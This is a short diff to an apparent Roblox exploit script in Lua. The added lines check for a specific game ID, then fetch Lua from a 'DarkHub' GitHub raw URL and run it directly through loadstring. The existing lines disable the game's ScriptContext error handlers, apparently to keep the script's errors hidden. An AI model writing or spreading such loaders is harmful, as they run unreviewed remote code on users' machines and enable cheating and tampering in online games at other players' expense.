@@ -1,3 +1,7 @@
+if game.GameId == 111958650 then
+    loadstring(game:HttpGet(('https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/Mhm'), true))()
+end
+
 if getconnections then
   for i,v in pairs(getconnections(game:GetService("ScriptContext").Error)) do
     v:Disable()
